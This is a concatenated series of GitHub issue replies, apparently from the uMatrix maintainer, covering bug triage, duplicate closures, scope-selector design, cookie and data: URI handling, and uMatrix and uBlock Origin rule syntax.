uMatrix/webext-hybrid version is really not doing well, the browser tried to connect to the remote servers above. The legacy version worked as expected. Clearly the webext API still has kinks which need to be fixed.. > pretty much every malicious script\nDisplaying an alert is not malicious. I showed you above that what one can do is quite limited with data: URI in address bar, a real proof of concept has a much longer way to go than just displaying an alert.. Other observations:\nThere is no way in the chrome API to prevent such javascript from executing. Even the chrome.contentSettings API does not allow to block this, as it requires a hostname, and data: URI do not have hostname.\nNoScript 5.0.3 will also not block the data: URI on Nightly. I have no clue as whether this is a NoScript issue, or me misusing NoScript (it has been a long time since I used it), or whether this is just the current version which is not yet fully migrated to the new webext API, or whether this will also be a limitation of the webext API as it is with the chrome API.. Bugzilla 1331351: Consider blocking top level window data: URIs. A real-world malicious attack was described here: https://gist.github.com/timruffles/5c76d2b61c88188e77f6.\nAs expected, it does not work with uMatrix with default settings of default-deny all active 3rd-party content, because no external resource can be 1st-party to a data: URI:\n\n. I again tested the test case above .\nWith the new NoScript 10 and default settings:\n\nWith uMatrix and default settings:\n\nuMatrix blocked the connection attempts, as it did when I first tested.. When you enter the URL of an image in the address bar, the browser will load the image as a document first, so uMatrix is being told that a document from static.payserve.com is being requested, which means a rule like * static.payserve.com image allow won't let the request through. You will need to allow document type specifically if you want the image to load, while not blanket-allowing anything else from static.payserve.com:\nstatic.payserve.com static.payserve.com doc allow\n\n\nit offered me to whitelist static.payserve.com termporarily or permanently\n\nThere is no such thing in uMatrix, you are confusing with uBlock. If you disable strict blocking permanently for a site in uBlock, you will find the rule in the My rules pane ni the dashboard. It will look like no-strict-blocking: [...] true.. > the images from static.payserve.com would not load even from the page they were on \nThumbnails at http://mysexykittens.com/photo.php?slug=c17_freshfaces_696 load fine with your rule * static.payserve.com image allow. Something else was preventing them from loading.. Disabling strict-blocking for static.payserve.com in uBO will not cause 3rd-party requests to static.payserve.com to be whitelisted.\nStrict-blocking is only the blocking of the root document, nothing more. If you want 3rd-party requests to static.payserve.com to be allowed when visiting mysexykittens.com, you will need an exception filter to counter payserve.com in Peter Lowe's (just like you also needed an allow rule for uMatrix):\n@@||static.payserve.com^$image,domain=mysexykittens.com\n\nOr make use of uBO dynamic filtering's allow rule:\nmysexykittens.com static.payserve.com * allow\n\nA rare case where allow is useful -- the rule can be created by just locally \"greening\" static.payserve.com while on mysexykittens.com.. Same for uBO: https://github.com/gorhill/uBlock/issues/1120. Can't reproduce with the webext version of uMatrix.. Browser limitation, only one extension can modify a HTTP header. You will have to pick which one you want to modify the header. Take note that uMatrix never make a CSP header less strict, it only makes them same or stricter. I believe Tampermonkey can potentially make the CSP header less strict. You will have to seek information with Tampermonkey authors.. No hint of you having investigated your ruleset, no hint of your ruleset, no hint that you investigated other extensions to rule out another extension being involved in your issue, no hint about your browser settings including tampering with about:config, no hint whether the issue is solved with a new profile. You will have to investigate yourself on your side, so far it's only you reporting such issue so this hints at something specific on your side causing this.\nPlease read carefully CONTRIBUTING -- I expect advanced users of uMatrix to be more thorough in their reporting.. Another basic thing to do is to look at the browser console.. Can't reproduce. You will have to investigate this on your side.. Can't reproduce. You will have to make more effort to report issue the proper way.\nClosing and marking as invalid, as per CONTRIBUTING.\n. uMatrix blocks only what its ruleset tells it to block.\nDid you look at the logger?\n\nneither does turning off all other functionality \n\nWhat \"other functionality\" exactly?\nMost likely explanation is that your ruleset is causing you trouble, you will have to make more effort to rule out this -- read carefully the font page of the project and CONTRIBUTING.. Again:\n\nDid you look at the logger?. There is no need to try random stuff, it always come down to: Use. The. Logger.\n\nAll cases of ruleset breaking pages would have been resolved with the logger, and selecting \"All\" entries to also find out stuff blocked in other contexts. When I say the extension is for \"advanced users\", there is the implicit assumption that advanced users are those who will investigate using the tools at their disposal, and the logger is at the top of these tools.\nI will be closing until there is a case actually made that uMatrix blocks stuff which it should not block, along with the supporting evidences. This is not the case here, since obviously the logger was never used.. Browser bug: https://bugzilla.mozilla.org/show_bug.cgi?id=1350077.. That's not how it works. Declined.\nI see nothing wrong with uMatrix's icon in Pale Moon. If you have an issue, make the case by opening a new issue along with all details of what exactly is the issue and screenshots showing it.. > becoming a little larger than before\nThat's true for other icons too, this is not specific to uMatrix. If I put Pale Moon's own \"Downloads\" icon in there, the toolbar's height is also increased. If I then put uMatrix's icon, the toolbar height's stays the same -- meaning uMatrix does not behave any differently than other standard icons.. > \"use small icons\" enabled\nWhere is that option?. Unable to reproduce with Nightly, FF54 and uMatrix 1.0.0.. > just set Firefox Content | Color settings are per https://imgur.com/a/zfDFU\nI did not notice the \"Always\" for \"Override the colors specified by the page with your selections above:\". I can reproduce if I select \"Always\".\nI will be straightforward: if you ask Firefox to override colors of all web pages (which is what uMatrix popup panel is), then you are asking for trouble, not just with uMatrix, but with probably a lot of other web pages. I just do not have the inclination and especially that sort of free time to \"fix\" this assuming one would agree in the first place the issue is with uMatrix. Declined.. Definitely not a uMatrix issue, report to browser devs.. It is, the link is the up arrow.. I can't remember why -- I am guessing I wanted to be sure people wouldn't click reflexively on the link, it had to be a conscious action.. > I can't remember why\nNow I do, I will write it down before I forget again.\nYou might not necessarily want to navigate to the URL as is, sometimes you may want to use the URL but without the added cruft at the end. Not making the whole URL a link makes easy to copy only a specific part of the URL -- something annoying/difficult to do when the whole text is a link.. Duplicate of #694.. It's explained in the Release notes.. Duplicate of #227.. Javascript is correctly blocked, just look at the console for the page.\nThe issue is duplicate of #319: with uMatrix the noscript tag is not rendered. If blocking javascript using the browser's own blocker, the noscript tag is rendered and it will cause the page to be redirected to the old account login.\nMarking as duplicate of #319. I will fix this by simply preventing uMatrix from overtaking the control of the browser's javascript setting. I did remove this in the past, but I put it back because back then I had problem to just say \"no\" (someone reported a case where he did not realize javascript was blocked by the browser and complained that uMatrix was not unblocking execution of javascript when creating an allow rule).. It's not listed because there is no media served by the page.\nClosing and marking as invalid, as per CONTRIBUTING.\n. Please use the logger before opening invalid issue -- that simple step would have saved time to both you and me.. You are not providing details about what browser you are talking about.\nI will assume a Chromium-based browser, and this is a browser behavior -- it won't disclose network request by an extension to another extension's webRequest listeners.. uMatrix blocks according to the user's ruleset, I can't think of anything special with regard to behind-the-scene requests between 0.9.3.6 and 1.0.0. Unlike uBO, uMatrix does not put obstacle to block behind-the-scene requests, the ruleset decides -- this includes switch rules such as matrix-off. I shouldn't be needed to investigate  anyone's ruleset, this is the first thing to look at when diagnosing issues, including using the logger.. Thanks.. UA agent will go soon, it's a toy feature which has no value in uMatrix. A real dedicated UA switcher which offers more control than uMatrix is what is best, and in case of fingerprinting concerns, the current UA switcher in uMatrix makes things worst.. How does it look when not using a dark theme? I wanted to slightly distinguish the background to remind the user he is in edit mode. What if using an alpha channel for the background color, so that both dark and light theme can have that visual hint?. I will import the changes for now as is because I can see it's really crippling for people using dark theme. I will eventually try to see if it's possible to offer a discrete visual hint which works with both dark and light theme.. Thanks.. I was thinking of using a translucent color (rgba with a = 0.1 or something like that) for the background color, so that the visual would work for any theme color.. Thanks.. Closing and marking as invalid, as per CONTRIBUTING.. I imported the code from uBO and forgot to remove the merge button, it's not supported in uMatrix.. I was wrong, merging from cloud was supported, I just needed to import the modified CSS from uBO.. The UA switcher will be removed, so there is no point working toward it. It's best to install a real, dedicated UA switcher, or if the goal is privacy, to deal with the fingerprinting issue with a better general approach -- like using Firefox anti-fingerprinting feature.. By design.. I have created documentation for this: https://github.com/gorhill/uMatrix/wiki/Lingering-domain-entries-in-the-matrix.. This is not a uMatrix issue, this is a site issue as a result of blocking stuff on it.. Browser bug, report to bugzilla please. uBO-Scope is also afflicted by this. Chromium's versions are fine.. I consider this to be related to:\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1309143. Force-reload using the shift key, to bypass the cache. If this works for you, please close this issue.. I could not reproduce your issue anyways, so I will close as unable to reproduce. The assumption with uMatrix is that if something does not work and I can't reproduce, you will have to investigate fully on your side why it's not working, and make the case the issue is with uMatrix along with evidence. This project is for advanced users.. I work differently: I set rules and reload. Once the page works, I click the padlock. A reload-on-save would be a nuisance to me and all others working the same way. In general it's best to avoid such surprise as a button which has two functions. To keep the padlock do one simple job is what is best.. > It took me ages to figure that was a drop down!\nYes, the scope selector was bothering me exactly for this reason. This was fixed in 1.1.8 with the new scope selector as suggested in https://github.com/gorhill/uMatrix/issues/821#issuecomment-345740820.. > The workaround that I\u2019ve found is to clear all of Firefox\u2019s history/data\nYou did not provide exact repro steps.\nShift-click the browser reload button when you have such issues, the browser is probably using its in-memory cache and bypassing uMatrix's handlers.\nClosing and marking as invalid, as per CONTRIBUTING.. Unable to reproduce. You are not providing exact steps to reproduce. Your gif is far from sufficient, I need you to find exactly how you reproduce on your side, I know nothing of your ruleset, how you travelled to that page, whether another extension interfere (try the same in a new profile with only uMatrix, no words on you using the logger to narrow the issue, etc.)\nDid you investigate whether the per-site switches interfere?\nClosing and marking as invalid, as per CONTRIBUTING.\nI will re-open if you provide proper steps to reproduce and I confirm there is an issue with uMatrix.. Your matrix shows empty script cells. Try to force reload using the browser button with the shift key pressed, to force a bypass of the browser cache.. > Coiners also work through obfuscated proxies injected into traffic that might look legit\nThey end up as script resources in your browser, that is what uMatrix deals with, and it's your choice to block scripts as you wish.. > RAM (& CPU) usage which is already quite high in uMatrix\nAbsolute nonsense. Provide a Gecko profile of your assertion, that's the only way any such assertion can be taken seriously.. Ok, the reload button in the popup will take into account the shift key to bypass the cache, just like the browser's own reload button.. It depends of the browser cache -- that's something which can't be predicted. For example, you may decide to block images after loading a page, and a reload may cause the image to still display, because sometimes they are still in the short-term memory cache. Another time you may go back in history and the page barely report any network traffic because it's all served from browser cache, bypassing the webRequest API.. Closing and marking as invalid, as per CONTRIBUTING.. > Also observe an (arguably) bug: the whitelisted mozilla.net is now in red (because we are now in the mozilla.org namespace), but the scripts are in fact allowed\nNot a bug, by design: the matrix shows you the rules for the current scope -- the scope where you actually create/remove rules. It make no sense to show the rules for the scope above, that would be just absolutely incomprehensible and unusable.\n\nno matter what always default to the lowest possible namespace, let the user \"move up\" if he wants to for the particular tab, but don't save the choice for the other tabs.\n\nuMatrix remembers the last scope (\"namespace\") you selected, and pick this one by default. In step 6, you went base domain name level, hence uMatrix starts to use this as the default. This is true also for the global scope, if you pick the global scope, uMatrix will keep using it as the default until you change it (some people might prefer working only in the global scope). TL;DR uMatrix remembers your last choice and use this as the default, when everything is considered, this is the best approach since it doesn't require uMatrix to \"guess\" what the user want, it's predictable.. I am having second thoughts -- there used to be a drop list in setting in HTTPSB to select the default scope level. I got rid of this with uMatrix because I wanted to keep the amount of settings to a minimum. I am undecided as to whether it would be good to bring in back. I will keep the issue open for a while until I decide.. > you don't expect that the changing domain from another tab (it is not obvious that you are actually changing the global default scope level) will affect the level in this tab too.\nOk, good point. I will restore the ability to set default scope in Settings: global, base domain, or page hostname.\nWhile at it, I want to experiment with a different way to navigate between scopes: using arrows instead of a dropdown. Arrows would means less clicks in most cases, and also the ability to navigate between other possible intermediate subdomains.. It seems the buttons work, but their visuals are not properly updated. I will investigate, hopefully a trivial fix I can push asap.. > one more namely \"Revert all temporary changes\"\nThat one was never disabled, it applies to all temporary rules, including the ones not seen -- the others apply to the temporary rules in the current matrix.. @theDuckIsAlive \n\nEven if we're in the behind-the-scene scope, you can see that wikipedia.org, mozilla.org\n\nBecause network requests to these sites were made i the behind-the-scene scope, so the connections are reported there. Typically favicons are fetched from behind-the-scene on Firefox. In any case, use the logger, it will show you what is requested from behind-the-scene.. @uBlock-user That is the new scope selector, what you are asking is to go back to the ancient, more cumbersome one -- which of course won't happen.. There is no white layer. In your picture, there is only www. not being selected, hence it shows as being disabled, pale gray.. The local scope is ghacks.net, that is why the www. part is shown as disabled. If the local scope was www.ghacks.net, the www. part would not be disabled. How would you suggest to present the non-active part of the local scope? I like it the current way, there is no ambiguity as to what is the current scope in effect.. > then don't show the sub-domain scope at all disabled or not disabled\nOf course not, someone might want to actually select a narrower scope to work on a ruleset at that level (for example I might want to set rules specific to groups.google.com). That is the point of the new scope selector, to quickly select any possible scope from top to bottom.. Look, I won't change what is there, I was merely trying to make you see the point of the new scope selector. So we will have to agree to disagree -- your sole argument currently is to remove key functionality for everybody because it \"looks very odd and disturbing to me\". So let's leave at that please.. I am open to more feedback from more users. Removing the ability to select a narrower scope would be a downgrade from before, this has always been possible.. Yes, I didn't see the point of forbidding it in the end with the new scope selector, though before I was forbidding it, one of the reason was not to make the drop down filled with what would probably a rarely used entry. But with the redesigned selector, the ability to set rules on the TLD comes for free really.. > I think just changing the colour of the text as per what @ArchangeGabriel has done with his mockup is a very good and much cleaner idea.\nI disagree. There must be no mistake as to which scope is currently in effect, the less ambiguous the better. uMatrix emphasizes a lot of at-a-glance approach, and for this it's important that it's obvious which scope is currently in effect.. As per logger, the browser makes a request of type main_frame (alias doc) to the remote server for the image, so uMatrix filters according to the doc type, not image type. So essentially uMatrix filters according to what the browser sends through the webRequest API.\nUpon arrival, the resource is transformed into an img tag into a document by the browser, this is where something needs fixing in uMatrix, the image should not be collapsed by uMatrix, because it was not blocked.. This was fixed with code changes in commit 73c8da05b759.. I don't believe in such feature. I explained numerous times in the past: not having the page reload when you close the matrix is best, because there will always be a case eventually where you don't want the page to reload upon closing the panel, and there will be no way to avoid this. Reloading a page must always explicitly demanded by the user, never be made automatically.. Support is dropped for Firefox legacy.. Please provide sensible title to issue you open, these are used for others to lookup issues, and it helps by not burdening me with the task of having to edit your issue. Is the following excerpt not clear in CONTRIBUTING?\n\nyou benefit from the carefully crafted code, return the favor by carefully crafting issues/bug reports.. Rules have to map to src des type action internally, this won't change, this is essentially uMatrix at its core. The suggestion here translate very well back and forth to uMatrix's internal syntax. Anything else that does not translate well into src des type action won't work and will just make the code unduly complicated -- not a good thing for stability.. > I was thinking of something along the lines of:\n\nThat was my understanding of your suggestion, and what I was planning to do, including keeping the types ordered as per current order in the matrix UI.. Duplicate of #824.. As stated numerous time, I don't have the time.\nVolunteer developers who are on GitHub have a real life outside GitHub. I wish our choice as developer to decline requests for our own reasons was respected, not argued.. You can access the dashboard by clicking the banner title at the top.. I reopen because I want to import the same behavior as with uBO: to have the dashboard remember the last pane used.. The change is already made -- I will create a new release candidate. I was never intending to support Android, but I tried the emulator in the browser and it turns out to my surprise it seems it could be supported with minimal amount of changes.\nI will remove the gear icon as I did for uBO: it's misleading, people think they have to click on it, while you can  click anywhere in the title bar.. You can try the latest dev build (1.1.7rc0) and see if this works better:\nhttps://addons.mozilla.org/en-US/firefox/addon/umatrix/versions/beta?page=1#version-1.1.7rc0. > Unable to scroll on the matrix tab on v1.1.8. Default view only shows up to the css column.\nI can't reproduce this with the mobile view emulator in the browser. So it seems I can't trust this to know what to do to make it work on a mobile device. I would appreciate help here as to what needs to be done first to make it render properly on a mobile device.\nI can scroll vertically, but not horizontally, so I guess it must be because of overflow-x.. Dev built 1.1.11b0 is available on AMO, hopefully this improves user experience on Firefox for Android. I didn't try it myself yet, except through emulation. I know there are still visual adjustements to be done for the top of the panel, but they are no usability issues, just cosmetic ones.. Report to Firefox devs please, uBO is javascript, the browser is not supposed to crash executing javascript.. Closing and marking as invalid, as per CONTRIBUTING.\n\nFor support/discussions, there is Mozilla Discourse.\n. I am still working on that wiki page, but the part which answers the question here is in there now: https://github.com/gorhill/uMatrix/wiki/The-popup-panel#the-type-cells.\n\nSorry for having been dismissive.\n. Did you look at the logger? You still have a switch on in the per-site switch. I will be closing because as asked in CONTRIBUTING, you are not making the case the issue is with uMatrix, otherwise you would have made the case the logger does not report anything blocked. Re-open when you make a better case.. Using the logger is really key here. I had a case myself where I had mistakenly enabled matrix filtering in the behind-the-scene scope and this was causing cookies to be unduly blocked as a result (I block cookie globally in uMatrix), and I was unable to log in into Twitter until eventually I saw the cookies blocked in the logger (the ability to see what specific rule caused something to be blocked/deleted is sorely missing in the logger, hopefully I will find the time to address this eventually).. Try the beta build on AMO, this was fixed: https://github.com/gorhill/uMatrix/pull/804.. Ok, I hadn't looked at your picture because it was a 404 -- I now fixed your image URL.\nYou are talking about the matrix panel. The issue is quite certainly on your side, you will have to investigate yourself. It seems to me your are using user styles in your Firefox, and these override uMatrix styles. It's for you to fix on your side.. Closing and marking as invalid, as per CONTRIBUTING.. Could be your anti-virus interfering? In any case, something on your side is interfering with your Firefox. You are best placed to investigate this on your side.. The browser is responsible for the icon in the toolbar, and to enable/disable extensions. Please bring this issue to Firefox support.. Thanks again :+1:. Looks all good to me, thanks!. Unable to reproduce:\n\n. > when I start my browser (FF 57.0) and my homepage loads (DDG) it shows as if it's disabled\nThat is \"normal\", there is no guarantee that uMatrix will load before a page load when the browser is launched. This is a browser issue: https://bugzilla.mozilla.org/show_bug.cgi?id=1418030.. @mspielberg Did you start uMatrix after the page was already loaded?. By the look of the popup panel, uMatrix was not able to find the tab for which it is brought up, this result in no data filling the popup. The next dev build will be more explicit about this, there will be a message that no web page data could be found, rather than a visually broken popup. This happens for example right after opening a new tab then bringing up the popup panel -- because uMatrix was not told by the browser API that a new tab had been created.\nStill, I can't reproduce this specific issue.. Just a screenshot without more info is not really useful. Browser? Version? Browser console? How about in a fresh profile? Etc.. Thanks for the info. I will publish a fix asap.. 1.1.16 is now available on AMO.\nHopefully this was also the issue suffered by OP.. What do you mean exactly by \"missing numbers\"?\nAlso, what is your version of Chrome?. Your Chrome version is too old. You need v45 minimum. The current version of Chrome is 62.. I see I am now using Array.from, but there could be other things as well. It's becoming very difficult to keep maintaining compatibility with old versions -- at some point polyfilling is burdensome. Best is that you keep using the last version which is compatible with your older Chrome. Chrome 39 is more than 3 years old, I can't hold back too long using convenient js syntax, this makes development easier.. Good idea, thanks \ud83d\udc4d . I just tried and it works fine.\nNot sure what you are reporting: when you click on github., the scope does not become github.com?. Just click the proper hostname label to select various scopes.\n. Thanks, and sorry about this regression.. Read the release notes please.\nIn any case, answer is above.. Also @ravenise, there was no reason for you to open the issue here, you were aware of the exact duplicate to this one since you commented in it a few minutes prior to opening this one.. I will add the ability to choose to open the logger as a popup window at the same time.. Duplicate of #539.. Please, read the release notes: https://github.com/gorhill/uMatrix/releases/tag/1.1.8.\nIt's by design. I had been smarter when I released the first version of uMatrix, this would have been the way I would have designed the scope selector.. Duplicate of #840.. The scrollbar issue is a browser bug, it does not occur with chromium, and it also occurs with other extensions in instances for which no scrollbars should be shown at all and yet they are.\nSee #811.\n@ShaunLeeClarke, just to be sure... I usually advise to not go full granular like I see in your screenshot, but rather keep that level of granularity for only when it's necessary.\nSee https://github.com/gorhill/uMatrix/wiki/The-popup-panel#the-destination--type-cells.\nIn the end it's up to you, I just want to be sure it's a deliberate choice, not that you thought you had to set your rules this way.. > I find it odd that text is selectable within the window\nWhat text specifically? There is an issue opened in here somewhere which asks to be able to select the hostnames in the matrix, it's currently not possible.. Well, extensions are now HTML documents. If I click in the background of the popup panel and press click and move the mouse, yes, I can select text in there.. If I add user-select: none; to the body element, it's not possible to select anymore.. By design, a block rule for a domain propagates to subdomains -- as opposed to when the hosts file is used in a OS. Hosts files do not support whitelisting.\nI don't plan to support pre-whitelisted hostnames in uBO, this is for users to decide.. Sorry, I don't want to be contacted for such demands, that's why I don't provide contact info. These projects are a hobby, I don't want these to be more than this.. Why does it have to be discussed out of public eye? I prefer these things to be talked about openly. If in the end it's to serve users' interests, it's only natural to talk about this publicly.. By design. The matrix is made of 4 distinct sections, in order from top to bottom:\n\nFirst party\nWhitelisted\nDomains with no rules\nBlacklisted\n. Oh that's right, I went strictly by the title, and read diagonally for the rest. Sorry.\n\n@ArchangeGabriel is right, duplicate.. Browser issue: https://bugzilla.mozilla.org/show_bug.cgi?id=1313401.. See if this workaround works for you: http://forums.mozillazine.org/viewtopic.php?f=9&t=3034189.. > Why is it possible? Does he not suffer from the same bug?\nBecause the default in uBO is to not show all subdomains. The default in uMatrix is to show all subdomains. uBO/uMatrix need to save a setting if and only if it is different from the default behavior.. > But if I set uBO in Firefox to show all subdomains and go to a private window, in my current and in a new profile, he keeps showing all the subdomains.\nOk, I don't have an answer for this, I need to investigate.. Ok, so I did not remember this, but with uBO, the collapsed state is part of user settings, it's being saved using the webext storage, and as such it means it's also exported/imported when you back up/restore your settings.\nWith uMatrix, this is not a user setting, this is a local UI setting, and so window.localStorage is used for this. The reason uMatrix does not persist in user settings is because each distinct base domain can be collapsed independently of the others (not possible with uBO), and given this, this means one could end up with a inordinate amount of setting information just for that collapsing feature in uMatrix (theoretically one could collapse 100s of base domains without ever touching the global collapse on the all cell).\nHowever you will find the same issue with uBO with regard to the 3rd-party filters pane, where each category can be collapsed independently of the others, and I considered this was just UI candy and there was no need to save this as a user settings -- we do not want these to grow unduly by being populated with what is purely a cosmetic (though convenient) settings.. > Transform the \"collapse/show all\" to a user setting\nYes, why not, there is no good reason to not save only this one.. Please let's stick to actual issues as requested in CONTRIBUTING.\nPeople can pronounce it as they wish.. <noscript> tags: duplicate of #319.\nCookies are not disabled browser wide with uMatrix, so this is the expected behavior. If you want the navigator.cookieEnabled to be false, disable cookies through your browser settings.. Regarding <noscript>, it's same as with your second point, uMatrix does not disable javascript browser-wide. I intend to eventually put a master switch for javascript, independant of the matrix, but the webext API does not support chrome's contentSettings API, and thus it's not possible to disable javascript with current Firefox such that the noscript tags get rendered.. I can't globally disable cookies from the matrix itself, it has to be a master switch: the matrix allows any sort of combinations of allow/block rules on a per domain basis, and this can only be evaluated on the fly, not in advance. This can't be reflected in a single variable such as navigator.cookieEnabled, it has to be a master switch, and I do not intend to have such feature for cookies, best is that you find an extension dedicated to this.. > NoScript addon can disable JavaScript and support <noscript> HTML tags so it is using a different API?\nI am guessing NoScript is doing what uMatrix/HTTPSB used to do? To replace noscript tags with div ones. I removed that workaround in uMatrix because this can also cause negative side effects.\nAddendum: apparently this was caused by Google's \"Instant Search Feature\", which no longer exists.. Unable to reproduce.. Really, I think you are not just scrolling completely to the bottom.\nMake a better case please:\n\nprovide exact repro steps (URL, filters, etc)\ndo not hide the most important part of your screenshot -- you covered the end of the scrollbar with a fat think orange line, preventing me to assess your scrollbar position.. Sorry, can't reproduce. You will have to investigate yourself about why you suffer the issue since I can't reproduce:\n\n\n. Your browser is supposed to properly compute the height which is needed, there is no need to resort to hardcoded values. . Duplicate of #784.\nNext time please be more considerate when you file an issue: provide all the relevant details. Browser/version is always key. Also, always search the issue tracker before opening a new issue: https://github.com/gorhill/uMatrix/issues?q=is%3Aissue+scroll+is%3Aclosed.. This is not an issue, this is a question. I do ask to not burden the issue tracker with support issue.\nI have closed the issue tracker in the past because of this burden. The only other solution is for people to be considerate and not open such invalid issues.\n~~Remove * * doc allow~~ Add * * doc inherit if you want root document to be blocked like other resources. The * * doc allow is not shown in My rules  because of a history of people removing it and filing invalid issues for uMatrix blocking too much as a result.\nClosing and marking as invalid, as per CONTRIBUTING.\n. https://github.com/gorhill/uMatrix/wiki/How-to-have-root-documents-blocked-by-default-everywhere. I don't maintain legacy version anymore.\nSomeone will have to step up to maintain the legacy version.. Closing and marking as invalid, as per CONTRIBUTING.. 1. MVPS was updated by the maintainer(s) on Nov. 30 -- the last update had been on Sep 15. There was no issue at all. Somehow you expect uMatrix to be update immeditely upon MVPS updating their hosts file. This is not a reasonable expectation.\n\nNow you report an issue with your own ruleset blocking behind-the-scene network requests. It's your own doing, there is a matrix-off: behind-the-scene true in out of the box ruleset. You removed it. There are consequences doing so.. Duplicate of #319.. https://chrome.google.com/webstore/detail/umatrix-dev-build/eckgcipdkhcfghnmincccnhpdmnbefki. Duplicate of #852. Fixed in current dev build.\n\n\nWould you mind sharing which API you use to store data that isn't deleted with the CTRL+SHIFT+DEL interface\n\nI don't know what is \"CTRL+SHIFT+DEL interface\".\nuMatrix saves its persistent settings (those saved in the backup file) through browser.storage.local. These are never erased by the browser unless you uninstall the extension.\nIndexedDB is used to save the content of the remote hosts files.\nThere is also window.localStorage used to persist small convenient UI settings. This is what was used to save the collapsing of the blacklisted hostnames section. That setting has now been converted to a persistent setting.. > The problem is that the setting is no longer and can cause a collapsed state to to stick\nI don't see how it's possible. uBO tests the stored value with === 'y', I don't see how this could ever succeed if the storage was cleared, the returned value in such case is null.\nI just tried, and when I clear \"Offline Website Data\", uBO's window.localStorage is cleared and the UI in your screenshot is reset. Of course, forcing a reload of the \"3rd-party filters\" pane was necessary.. Duplicate of #350.\nuBO does not work differently.. Duplicate of #827.. This is already the case.\nYou will need to provide repro steps as asked from you in CONTRIBUTING.\nI will reopen if you make the case as per CONTRIBUTING.. Actually, trying to understand your issue, I realize you are asking me to make the feature do the opposite of what it says it does.. about:addons is a priviledged page, webext extensions do not work on these.. Referrer spoofing has not been removed, user agent spoofing has been removed.. Yes, a fix will be published shortly. Duplicate of #840.. 1.1.16 has been pushed to AMO, shouldn't take long before it's available.\nSorry about the issue.. Thanks. I've gotten back to use uMatrix as well lately (without uBO enabled), and I am back to appreciate the unique advantages of uMatrix over uBO, and also by using it I am better placed to keep improving it -- it had been a bit neglected since a while now.. I can reproduce immediately just clicking \"new tab\" icon.. You are not providing uMatrix version. Read carefully CONTRIBUTING please.\nUnable to reproduce. Investigate more on your side, browser console, etc. Without actionable information, I will have to close this issue.\nAlso, try with a brand new profile and do not customize, I suspect some custom browser settings are causing your issue.. Duplicate of #840.. Your issue was mentioned in the release notes, which I also always post on AMO.. > Block objects are in most cases wanted \"Global\"\nTrue. \n\nso you have to edit all these rules manually later.\n\nWhy \"manually later\"? It is just a matter of selecting the global scope and creating the block rules from there.\nI understand the gist of the suggestion and can see the convenience. However it departs from what-you-see-is-what-you-get. That one mantra needs to be respected as much as possible, to keep interacting with the matrix completely predictable: the scope selected when you set the rule is where the rule will apply.\nHaving to select the global scope is a minor inconvenience after all, given that in the long run, it becomes less and less likely that block rules are going to be created (default-deny is natural way of using Matrix) -- so no need to make things more complicated than they are.. > when firefox is started with uMatrix enabled, there are several network connections initiated by uMatrix [...] The connections arre kept established the hole time the firefox process is active\nuMatrix does not initiate connections on start up (unless one of the filter lists enabled is not present locally -- this happens at 1st launch only), and does not keep \"connections [...] established the hole time the firefox process is active\".\nYour issue is missing all the details to make the case you are trying to make, you provide absolutely no technical details supporting your assertions.\nClosing and marking as invalid, as per CONTRIBUTING.. As said, this occurs only the first time uMatrix is launched for hosts files which are not part of the package, this does not happens ever again afterward, unless one wipe uBO's indexedDB somehow.\nAnd the claim \"keep \"connections [...] established\" is nonsense.\nI am suspecting OP is trolling: an account created a few minutes ago, and provide no details whatsoever as to where uMatrix is supposedly connecting and keep getting connected.. > But aren\u2019t filter lists updated?\nSure, but some minutes after start up, and only when needed -- just like with uBO. The update period in uMatrix is longer than with uBO: 11-13 days (uBO is ~4-5 days unless explicitly set by a filter list directive).. #825 does not requires a rewrite of the core filtering code.\nYour suggestion would require a serious rewrite of the core filtering, and would cause quite an additional overhead to what is there now.\nDeclined.. Your issue is un-actionnable. Investigate on your site to find the root cause of your issue. Browser crash can lead to storage corruption, it's out of uMatrix's scope.. > wait 15 minutes and failed to delete cookie: https://github.com/... will be reported in logger\nNothing I can do. The message is merely uMatrix reporting the result of the webext API call.. Thanks for the link.\nIt says the issue was fixed for FF59, and @cy7yz2rj reports the issue for FF58.\nSo is there really an issue with uMatrix when using FF59+?. For which version of Firefox?. Thanks for the fix and for catching this.. Declined. There is no API to synchronously delete cookies, all APIs are asynchronous in WebExtensions.\nIf you are afflicted by such worries, just prevent all cookies from being set in your browser, or block all javascript by default.. These issues have nothing to do with synchronous cookie deletion. If so, point me exactly where it's explicitly said. First link is merely about controlling the global Firefox setting regarding cookie behavior. The second issue is the implementation of browser.contentSettings, which already exists in Chromium. That API is not suitable for uMatrix, it's a declarative API, while in uMatrix decisions are handled on the fly according to matrix ruleset. As said, you will have to look elsewhere if you are not happy with how uMatrix deals with cookies -- simply whitelist all cookies in uMatrix and install whatever extension works for you with regard to cookies.. > \"reject cookies from blacklisted domains\"\nOk, I will consider the proposal.\nA side-effect of rejecting cookies is that uBO won't be able to report specific cookies in the logger, but given that they come from blacklisted sites, that shouldn't be seen as an issue.. After more thoughs, back to declined. This has been already discussed in the past. So again, if you do not like the way uMatrix deals with cookies, whitelist them all and use another extension that meet your expectations to deal with them.. @t33rex No browser settings match the matrix ruleset.\nFrankly, there is no real actual issue, aside people spending too much time to worry. So far is what has never happened with this cookie story: come up with an actual, working proof of concept which shows real, actual harm. And as said, if one obsessively worries about these cookies, just block javascript. It does not make much sense to worry about cookies being deleted immediately before a fraction of second elapse while having no issue to execute javascript from the same site.. > Not sure what you mean. I can block all scripts on Github and it will still set cookies.\nYes, and none of those cookies will ever leave your browser if uMatrix is told to block them. Why do you leave that out in your response above as if not relevant?\nIf you want your point to move further, provide a working proof of concept of harm -- there is no way around this -- anything else is just repeating what has already been said and to keep spending time on this is a burden at this point.. > For question/support/discussions, there is Mozilla Discourse:\nhttps://www.reddit.com/r/uMatrix/\n(I corrected the \"Mozilla Discourse\" to \"Reddit's /r/uMatrix\"). More generally, you propose the ability to isolate a scope from the parent one.. \n    *  * block\n    behind-the-scene *  block\nUsing the all cell to decide whether a scope is isolated or not is an interesting idea -- I like it. \nCurrently the UI does not work for this though, as the all cell can toggle only between block and allow, so addressing this point would allow the proposal be implemented seamlessly in the core filtering code, the idea fits well with what is already in there.. > What about using matrix-off: behind-the-scene false instead of behind-the-scene * * block ?\nHe wants the ability to modify the way rules propagate on the z axis (from broader scopes to narrower ones), the matrix-off switch is to toggle on/off matrix filtering, I don't find this a good match for modifying z-propagation. The all cell however is a good choice, there currently is no such thing as scope * * inherit, this rule means nothing in uMatrix. So it is available for leverage -- the inherit action is already used in other cells to prevent looking up a rule from a broader scope, i.e. as a way to disable z-propagation -- something which he already uses, but he has to do it for every single allow rules added in the global scope, I can see the inconvenience.. uMatrix for Legacy Firefox is no longer maintained: see #824.. Use uBlock Origin if you want higher granularity.. Please search opened issues 